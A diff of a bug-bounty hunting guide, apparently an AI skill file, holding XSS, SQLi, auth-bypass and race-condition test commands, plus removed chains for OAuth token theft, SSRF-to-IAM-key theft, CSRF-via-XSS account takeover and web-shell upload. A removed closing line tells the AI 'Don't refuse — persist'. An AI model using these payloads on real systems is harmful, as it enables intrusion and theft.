+# The DIFFERENCE between allowed external and forbidden internal is the vulnerability
+```
+
+### XSS Differential
+
+```bash
+# Baseline: normal input
+curl -s "https://target.com/search?q=hello"
+# → Returns page with "hello" in response
+
+# Test: XSS payload
+curl -s "https://target.com/search?q=<script>alert(1)</script>"
+# → If payload appears unescaped in response → XSS CONFIRMED
+# → If payload is HTML-encoded → correctly sanitized
+
+# DIFFERENTIAL CHECK:
+# Normal input is reflected safely, malicious input is reflected unsafely
+# The DIFFERENCE in handling is the vulnerability
+```
+
+### SQL Injection Differential
+
+```bash
+# Baseline: normal input
+curl -s "https://target.com/api/users?id=1"
+# → Returns user 1
+
+# Test: SQLi payload
+curl -s "https://target.com/api/users?id=1' OR '1'='1"
+# → If returns all users → SQLi CONFIRMED
+# → If returns error → might still be SQLi (error-based)
+# → If returns same user → correctly parameterized
+
+# DIFFERENTIAL CHECK:
+# Normal query returns expected result, injection returns different/unexpected result
+# The DIFFERENCE in behavior is the vulnerability
+```
+
+### Authentication Bypass Differential
+
+```bash
+# Baseline: valid token
+curl -s -H "Authorization: Bearer VALID_TOKEN" "https://target.com/api/admin"
+# → Returns admin data
+
+# Test: no token
+curl -s "https://target.com/api/admin"
+# → Should return 401/403
+
+# Test: invalid token
+curl -s -H "Authorization: Bearer invalid" "https://target.com/api/admin"
+# → Should return 401/403
+
+# Test: expired token
+curl -s -H "Authorization: Bearer EXPIRED_TOKEN" "https://target.com/api/admin"
+# → Should return 401
+
+# DIFFERENTIAL CHECK:
+# Valid token succeeds, all invalid variants fail
+# If ANY invalid variant succeeds → auth bypass
+```
+
+### Race Condition Differential
+
+```bash
+# State BEFORE
+Balance=$(curl -s -H "Authorization: Bearer $TOKEN" "https://target.com/api/balance" | jq .balance)
+echo "Before: $Balance"
+
+# Send N concurrent requests
+for i in $(seq 1 20); do
+  curl -s -X POST -H "Authorization: Bearer $TOKEN" "https://target.com/api/redeem" \
+    -d '{"coupon":"DISCOUNT50"}' &
+done
+wait
+
+# State AFTER
+BalanceAfter=$(curl -s -H "Authorization: Bearer $TOKEN" "https://target.com/api/balance" | jq .balance)
+echo "After: $BalanceAfter"
+
+# DIFFERENTIAL CHECK:
+# If BalanceAfter shows multiple discounts applied → race condition CONFIRMED
+# Expected: discount applied once. Actual: applied N times.
+```
+
+---
+
+## ADVANCED CHAIN BUILDING
 
 ### Chain Architecture Principles
 
 ```
 PRINCIPLE 1: Every Finding is a Chain Link
-  - Don't report individual findings
-  - Connect them into exploit chains
-  - Low + Medium + Low = Critical
+  Don't report individual findings
+  Connect them into exploit chains
+  Low + Medium + Low = Critical
 
 PRINCIPLE 2: Chains Must Be End-to-End
-  - Each step must be proven
-  - Each step must lead to the next
-  - The final impact must be demonstrated
+  Each step must be proven
+  Each step must lead to the next
+  The final impact must be demonstrated
 
 PRINCIPLE 3: Chains Pay More Than Singles
-  - Single IDOR: $1K-$5K
-  - IDOR chain to ATO: $10K-$50K
-  - SSRF to RCE: $50K-$500K
+  Single IDOR: $1K-$5K
+  IDOR chain to ATO: $10K-$50K
+  SSRF to RCE: $50K-$500K
 ```
 
-### Complex Chain Templates
+### Known A→B→C Chains
 
-**Chain 1: Recon → Open Redirect → OAuth Theft → ATO → Mass Data Exfil**
 ```
-Step 1: Find open redirect at /redirect?url=evil.com
-  Evidence: curl -s "https://target.com/redirect?url=https://evil.com" → 302 to evil.com
-
-Step 2: Find OAuth flow uses /redirect as callback
-  Evidence: OAuth URL contains redirect_uri=https://target.com/redirect
-
-Step 3: Chain: Open redirect → OAuth code interception
-  Attack: https://target.com/redirect?url=https://target.com/callback?code=STOLEN
-  Evidence: OAuth code visible in redirect chain
-
-Step 4: Exchange code for token
-  Attack: Use stolen code to get access token
-  Evidence: Access token returned
-
-Step 5: Use token to access user data
-  Attack: curl -H "Authorization: Bearer STOLEN_TOKEN" https://target.com/api/user
-  Evidence: User's private data returned
-
-Step 6: Enumerate all users
-  Attack: Loop through user IDs with stolen token
-  Evidence: Mass data exfil
-
-Report: "Open redirect in OAuth flow allows account takeover and mass data exfil" (Critical)
-Payout: $50K-$100K
-```
-
-**Chain 2: Recon → IDOR → Mass Assignment → Admin → RCE**
-```
-Step 1: Find IDOR on /api/users/{id} (read other user's data)
-  Evidence: curl -H "Authorization: Bearer ATTACKER_TOKEN" https://target.com/api/users/VICTIM_ID → victim's data
-
-Step 2: Find IDOR on /api/users/{id}/update (write other user's data)
-  Evidence: curl -X PUT -H "Authorization: Bearer ATTACKER_TOKEN" https://target.com/api/users/VICTIM_ID -d '{"email":"attacker@evil.com"}' → email changed
-
-Step 3: Find mass assignment on /api/users/me/update
-  Evidence: curl -X PUT -H "Authorization: Bearer ATTACKER_TOKEN" https://target.com/api/users/me/update -d '{"role":"admin"}' → role changed to admin
-
-Step 4: Chain: IDOR → mass assignment → admin
-  Attack: Change victim's email → reset password → login as victim → mass assign admin → admin access
-
-Step 5: Find admin RCE (command injection, file upload, etc.)
-  Evidence: Admin panel has command execution feature
-
-Report: "IDOR + mass assignment chain allows full admin takeover and RCE" (Critical)
-Payout: $50K-$200K
-```
-
-**Chain 3: Recon → SSRF → Cloud Metadata → IAM Keys → S3 Access → Data Exfil → RCE**
-```
-Step 1: Find SSRF at /api/fetch?url=http://...
-  Evidence: curl "https://target.com/api/fetch?url=http://httpbin.org/ip" → httpbin response
-
-Step 2: Reach cloud metadata endpoint
-  Evidence: curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/" → AWS metadata
-
-Step 3: Extract IAM credentials
-  Evidence: curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME" → AWS keys
-
-Step 4: Use IAM keys to access S3
-  Attack: aws s3 ls s3://target-bucket/ --access-key-id ACCESS_KEY --secret-access-key SECRET_KEY
-  Evidence: List of S3 buckets
-
-Step 5: Access sensitive data in S3
-  Attack: aws s3 cp s3://target-bucket/database-backup.sql . --access-key-id ACCESS_KEY --secret-access-key SECRET_KEY
-  Evidence: Database backup with user data
-
-Step 6: Find RCE via S3 ( Lambda, EC2 user-data)
-  Attack: Modify Lambda function code or inject into EC2 user-data
-  Evidence: Command execution on server
-
-Report: "SSRF to cloud metadata allows full infrastructure compromise and RCE" (Critical)
-Payout: $100K-$500K
-```
-
-**Chain 4: Recon → XSS → CSRF → Account Takeover → Lateral Movement**
-```
-Step 1: Find reflected XSS on search page
-  Evidence: curl "https://target.com/search?q=<script>alert(1)</script>" → alert executes
-
-Step 2: Find CSRF on email change endpoint (no CSRF token)
-  Evidence: curl -X POST https://target.com/api/email/change -d "email=attacker@evil.com" → email changed without CSRF token
-
-Step 3: Chain: XSS → inject CSRF payload
-  Attack: https://target.com/search?q=<script>fetch('https://target.com/api/email/change',{method:'POST',body:'email=attacker@evil.com',credentials:'include'})</script>
-  Evidence: Victim's email changed when visiting search page
-
-Step 4: Trigger password reset
-  Attack: Use changed email to trigger password reset
-  Evidence: Password reset email sent to attacker's email
-
-Step 5: Login as victim
-  Attack: Use password reset to take over account
-  Evidence: Full account access
-
-Step 6: Lateral movement
-  Attack: Use victim's access to find more vulnerabilities
-  Evidence: Access to other users' data, admin functions
-
-Report: "XSS + CSRF chain allows full account takeover and lateral movement" (Critical)
-Payout: $50K-$100K
-```
-
-**Chain 5: Recon → GraphQL Introspection → Auth Bypass → Mass Data Exfil → ATO**
-```
-Step 1: Find GraphQL endpoint with introspection enabled
-  Evidence: curl -X POST https://target.com/graphql -d '{"query":"{__schema{types{name}}}"}' → full schema
-
-Step 2: Find mutations without auth checks
-  Evidence: curl -X POST https://target.com/graphql -d '{"query":"mutation{updateUser(id:\"1\",email:\"attacker@evil.com\"){id,email}}"}' → email changed
-
-Step 3: Chain: Introspection → auth bypass → mass data exfil
-  Attack: Enumerate all users via GraphQL query
-  Evidence: All user data returned
-
-Step 4: Account takeover via GraphQL
-  Attack: Change victim's email → reset password → login
-  Evidence: Full account access
-
-Report: "GraphQL auth bypass allows mass data exfil and account takeover" (Critical)
-Payout: $50K-$200K
-```
-
-**Chain 6: Recon → Race Condition → Double Spend → Financial Fraud**
-```
-Step 1: Find race condition on coupon redemption
-  Evidence: Send 20 concurrent requests with same coupon → all succeed
-
-Step 2: Chain: Race condition → double spend
-  Attack: Use same coupon 20 times before it's marked as used
-  Evidence: 20 discounts applied instead of 1
-
-Step 3: Scale the attack
-  Attack: Generate 1000 coupon codes, race each one 20 times
-  Evidence: $10,000 in unauthorized discounts
-
-Report: "Race condition allows unlimited coupon reuse and financial fraud" (Critical)
-Payout: $50K-$100K
-```
-
-**Chain 7: Recon → File Upload → Web Shell → RCE → Full Server Compromise**
-```
-Step 1: Find file upload endpoint
-  Evidence: curl -X POST -F "file=@test.jpg" https://target.com/api/upload → upload successful
-
-Step 2: Bypass file type restriction
-  Attack: Upload shell.php.jpg or shell.php%00.jpg
-  Evidence: File uploaded successfully
-
-Step 3: Access uploaded web shell
-  Evidence: curl https://target.com/uploads/shell.php → command execution
-
-Step 4: Full server compromise
-  Attack: Use web shell to read /etc/passwd, database credentials, etc.
-  Evidence: Full server access
-
-Report: "File upload to RCE allows full server compromise" (Critical)
-Payout: $50K-$200K
+BUG A (Signal)          →  HUNT FOR BUG B              →  ESCALATE TO C
+══════════════════════════════════════════════════════════════════════════════
+IDOR (read)             →  PUT/DELETE on same endpoint  →  Full account manipulation
+SSRF (any)              →  Cloud metadata access         →  IAM credential exfil → RCE
+XSS (stored)            →  HttpOnly check on session     →  Session hijack → ATO
+Open redirect           →  OAuth redirect_uri accepts    →  Auth code theft → ATO
+S3 bucket listing       →  JS bundle enumeration         →  OAuth client_secret → chain
+Rate limit bypass       →  OTP brute force               →  Account takeover
+GraphQL introspection   →  Missing field-level auth      →  Mass PII exfil
+Debug endpoint          →  Leaked env variables           →  Cloud credential → infra access
+CORS reflects origin    →  Test with credentials         →  Credentialed data theft
+Host header injection   →  Password reset poisoning      →  ATO via reset link
+File upload             →  SVG XSS / path traversal      →  Stored XSS → ATO
 ```
 
 ---
 
-## ⏱️ ELITE HUNTER TECHNIQUES — Time Management & Efficiency
+## TIME MANAGEMENT
 
 ### The 5-Minute Rule
 
@@ -575,10 +711,6 @@ If you can't determine if a finding is real within 5 minutes:
 → Mark as "needs more investigation"
 → Move to next target
 → Come back later if time permits
-
-Don't spend 30 minutes on a single 403 response.
-Don't spend 1 hour on a single endpoint.
-Don't spend 1 day on a single target.
 ```
 
 ### The 20-Minute Rotation
@@ -598,43 +730,17 @@ If NO to all 3 → MOVE TO NEXT TARGET
 If you've been on one target for 1 hour with no findings:
 → Switch to a different target
 → Come back tomorrow with fresh eyes
-→ Sometimes stepping away reveals what you missed
-```
-
-### Priority Queue
-
-```
-HIGH PRIORITY (test first):
-  - Payment/billing endpoints
-  - Admin panels
-  - Authentication system
-  - File upload endpoints
-  - GraphQL endpoints
-  - Mobile API endpoints
-  - Staging/debug environments
-
-MEDIUM PRIORITY (test second):
-  - User profile endpoints
-  - Data export endpoints
-  - API endpoints with ID parameters
-  - Search/filter endpoints
-
-LOW PRIORITY (test last):
-  - Static assets
-  - Documentation pages
-  - Contact forms
-  - Newsletter signup
 ```
 
 ---
 
-## 🛠️ TOOL MASTERY — Perfect Integration
+## TOOL MASTERY
 
 ### Tool Selection Matrix
 
 ```
 TASK                        → PRIMARY TOOL      → SECONDARY TOOL
-═══════════════════════════════════════════════════════════════════
+══════════════════════════════════════════════════════════════════
 Subdomain enumeration       → subfinder          → amass, assetfinder
 DNS resolution              → dnsx               → dig, nslookup
 HTTP probing                → httpx              → curl, wget
@@ -651,150 +757,9 @@ Subdomain takeover          → subzy              → dnsreaper
 Static analysis             → semgrep            → bandit, brakeman
 ```
 
-### Tool Usage Patterns
-
-```bash
-# Recon Pattern: Full Attack Surface Discovery
-subfinder -d $TARGET -o subs.txt
-dnsx -l subs.txt -a -aaaa -cname -mx -ns -txt -o resolved.txt
-httpx -l resolved.txt -sc -title -tech-detect -follow-redirects -o alive.txt
-nuclei -l alive.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei.txt
-
-# Scanning Pattern: Vulnerability Detection
-nuclei -l alive.txt -t ~/nuclei-templates/http/vulnerabilities/ -o vulns.txt
-nuclei -l alive.txt -t ~/nuclei-templates/http/misconfiguration/ -o misconfigs.txt
-nuclei -l alive.txt -t ~/nuclei-templates/http/exposures/ -o exposures.txt
-
-# Exploitation Pattern: Targeted Testing
-ffuf -u https://target.com/FUZZ -w wordlist.txt -ac
-dalfox url "https://target.com/?q=test" --blind yoursrv.xss.ht
-sqlmap -u "https://target.com/?id=1" --batch --dbs
-
-# Secret Pattern: Credential Discovery
-trufflehog filesystem ./ --only-verified
-gitleaks detect --source . --report-format json
-```
-
 ---
 
-## 🎯 COMPLETE VULNERABILITY COVERAGE — All Techniques
-
-### Web Application Vulnerabilities
-
-| # | Class | Detection Pattern | Verification | Chain Opportunity |
-|---|-------|-------------------|--------------|-------------------|
-| 1 | **IDOR** | Change ID in URL/body | Must show different user's data | → ATO |
-| 2 | **Broken Auth** | Access admin without auth | Must return real admin data | → Privilege Escalation |
-| 3 | **XSS** | Inject script in input | Must execute in browser | → Session Hijack → ATO |
-| 4 | **SSRF** | Access internal URL | Must return internal data | → RCE |
-| 5 | **Business Logic** | Manipulate price/quantity | Must affect business logic | → Financial Fraud |
-| 6 | **Race Condition** | Send concurrent requests | Must succeed multiple times | → Double Spend |
-| 7 | **SQLi** | Inject SQL syntax | Must return SQL error or data | → Data Exfil |
-| 8 | **OAuth** | Manipulate redirect_uri | Must intercept OAuth code | → ATO |
-| 9 | **File Upload** | Upload malicious file | Must execute or traverse | → RCE |
-| 10 | **GraphQL** | Query introspection | Must expose schema/data | → Mass Data Exfil |
-| 11 | **LLM/AI** | Prompt injection | Must bypass safety controls | → Data Exfil |
-| 12 | **API Misconfig** | Add extra fields | Must modify behavior | → Privilege Escalation |
-| 13 | **SSTI** | Inject template syntax | Must evaluate expression | → RCE |
-| 14 | **Subdomain Takeover** | Check dangling CNAME | Must claim subdomain | → OAuth Theft |
-| 15 | **Cloud Exposure** | Check S3/GCP buckets | Must access bucket data | → Data Exfil |
-| 16 | **HTTP Smuggling** | Send conflicting headers | Must desynchronize | → Cache Poisoning |
-| 17 | **Cache Poisoning** | Inject unkeyed header | Must poison cache | → Stored XSS |
-| 18 | **MFA Bypass** | Skip MFA step | Must access account | → ATO |
-| 19 | **SAML** | Manipulate SAML assertion | Must authenticate as other user | → ATO |
-| 20 | **Error Disclosure** | Trigger error response | Must expose sensitive info | → Further Attack |
-
-### Web3 / Smart Contract
-
-| # | Class | Detection Pattern | Verification | Chain Opportunity |
-|---|-------|-------------------|--------------|-------------------|
-| 1 | **Accounting Desync** | Compare state variables | Must show phantom value | → Fund Theft |
-| 2 | **Access Control** | Test sibling functions | Must find missing modifier | → Admin Functions |
-| 3 | **Reentrancy** | Call during callback | Must re-enter before state update | → Fund Drain |
-| 4 | **Oracle Manipulation** | Check price feeds | Must manipulate price | → Undercollateralized Loans |
-| 5 | **Flash Loan** | Borrow and manipulate | Must profit from flash loan | → Governance Attack |
-
-### Enterprise Platforms
-
-| Platform | Key Attack | Detection | Verification |
-|----------|------------|-----------|--------------|
-| **M365** | OAuth misconfig | Check OAuth permissions | Must access tenant data |
-| **Okta** | Session hijacking | Check session management | Must impersonate user |
-| **AWS** | S3 bucket misconfig | Check bucket policy | Must access bucket data |
-| **GCP** | IAM misconfig | Check IAM bindings | Must escalate privileges |
-
----
-
-## 🧪 FALSE POSITIVE VERIFICATION — Every Finding Must Pass
-
-### Verification Checklist
-
-```
-FOR EVERY FINDING, VERIFY:
-
-1. REAL DATA ACCESS?
-   - Does it return actual user data? (not mock/empty)
-   - Can I show the data belongs to another user?
-   - Can I repeat the finding consistently?
-
-2. IMPACT DEMONSTRATED?
-   - What can an attacker DO with this?
-   - How many users are affected?
-   - What's the business impact?
-
-3. REPRODUCIBLE?
-   - Can I write exact steps to reproduce?
-   - Can a triager follow my steps and see the same result?
-   - Is the finding consistent across multiple attempts?
-
-4. NOT A DESIGN DECISION?
-   - Is this intended behavior?
-   - Is this documented anywhere?
-   - Would the developer say "that's by design"?
-
-5. NOT A KNOWN ISSUE?
-   - Have I checked disclosed reports?
-   - Have I checked GitHub issues?
-   - Have I checked changelog?
-```
-
-### Common False Positives to Avoid
-
-```
-FALSE POSITIVE: "GraphQL introspection works"
-REALITY: Introspection alone is not a bug. Need auth bypass or data exfil.
-
-FALSE POSITIVE: "CORS reflects origin"
-REALITY: Need Access-Control-Allow-Credentials: true AND sensitive data.
-
-FALSE POSITIVE: "Endpoint returns 200 without auth"
-REALITY: Need to verify it returns real data, not empty/mock.
-
-FALSE POSITIVE: "Error message shows SQL syntax"
-REALITY: Need to verify you can extract data, not just see errors.
-
-FALSE POSITIVE: "Open redirect exists"
-REALITY: Need to chain with OAuth/code theft for impact.
-
-FALSE POSITIVE: "SSRF with DNS callback"
-REALITY: Need to access internal services or cloud metadata.
-
-FALSE POSITIVE: "Missing security headers"
-REALITY: Not a vulnerability unless chained with exploitation.
-
-FALSE POSITIVE: "Version disclosure"
-REALITY: Only a vulnerability if there's a known CVE.
-
-FALSE POSITIVE: "Self-XSS"
-REALITY: Only a vulnerability if you can trigger it on another user.
-
-FALSE POSITIVE: "Clickjacking on non-sensitive page"
-REALITY: Need to demonstrate actual user action hijacking.
-```
-
----
-
-## 📊 REPORTING — Get Paid
+## REPORTING
 
 ### Report Structure
 
@@ -824,7 +789,7 @@ I confirmed this by [method] and demonstrated [proof].
 
 ```
 SEVERITY → PAYOUT RANGE → HOW TO MAXIMIZE
-═══════════════════════════════════════════════════════════════
+══════════════════════════════════════════════════════════════
 Critical  → $10K-$500K  → Prove ATO, RCE, or mass data exfil
 High      → $5K-$50K    → Prove privilege escalation or financial impact
 Medium    → $1K-$15K    → Prove data access or auth bypass
@@ -834,69 +799,4 @@ Info      → $0-$500     → Only if chained with other findings
 
 ---
 
-## 🧠 AI-ASSISTED HUNTING — Use Me as Your Genius Brain
-
-### What I Can Do For You
-
-1. **Generate attack plans** — "Here are the 5 most likely vulnerabilities for this endpoint"
-2. **Write exploit code** — "Here's a Python script to test for IDOR"
-3. **Build bypass payloads** — "Here are 10 WAF bypass variants for your XSS payload"
-4. **Analyze responses** — "This 403 response suggests a WAF is blocking you, try these bypasses"
-5. **Chain findings** — "Your XSS + CSRF finding can be chained into an ATO"
-6. **Write reports** — "Here's a HackerOne report for your finding"
-7. **Suggest next steps** — "After finding IDOR, test these sibling endpoints"
-8. **Verify findings** — "This looks like a false positive because..."
-9. **Optimize testing** — "Focus on these 3 endpoints first because they're highest value"
-10. **Build chains** — "Your open redirect + OAuth = ATO chain"
-
-### High-Signal Prompts
-
-```
-"Target: example.com. Generate an attack plan for their /api/admin/* endpoints."
-"Target: example.com. I found XSS on search. What can I chain it with?"
-"Target: example.com. I'm getting 403 on /admin. Generate 10 bypass techniques."
-"Target: example.com. I found SSRF but only DNS callback. How do I escalate to cloud metadata?"
-"Target: example.com. Write a Python script to test for IDOR on their user endpoints."
-"Target: example.com. Their GraphQL has introspection. Generate an attack plan."
-"Target: example.com. I found a race condition on coupon redemption. How do I prove financial impact?"
-"Target: example.com. I found this error message: [error]. Is this a real vulnerability?"
-"Target: example.com. I found open redirect + OAuth. Build the full ATO chain."
-"Target: example.com. I found S3 bucket listing. What's the escalation path to RCE?"
-```
-
----
-
-## 📚 RESOURCES & TOOLS
-
-### Essential Tools
-```bash
-# Recon
-subfinder, httpx, dnsx, nmap, naabu, katana, gau, waybackurls
-
-# Scanning
-nuclei, dalfox, sqlmap, ffuf, arjun, kiterunner
-
-# Exploitation
-curl, python3, burpsuite, mitmproxy
-
-# Wordlists
-seclists, payloadsallthethings, wordlists
-```
-
-### Wordlists
-```bash
-# Common paths
-/usr/share/wordlists/dirb/common.txt
-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-# API endpoints
-~/wordlists/api-endpoints.txt
-~/wordlists/burp-parameter-names.txt
-
-# Subdomains
-~/wordlists/subdomains-top1million-5000.txt
-```
-
----
-
-**Remember**: The goal is to find bugs that cause REAL HARM to REAL USERS. Every test must have a concrete HTTP request as evidence. Every finding must have a clear impact statement. Every report must be copy-paste ready for submission. Don't theorize — exploit. Don't analyze — attack. Don't refuse — persist. Every 403 is a signal. Every error is a clue. Every response tells a story. Read the story, find the bug, chain it, prove it, report it, get paid.
+**Remember**: The goal is to find bugs that cause REAL HARM to REAL USERS. Every test must have a concrete HTTP request as evidence. Every finding must pass all 7 gates. Every report must be copy-paste ready for submission. Optimize for validated findings per hour, not finding count.
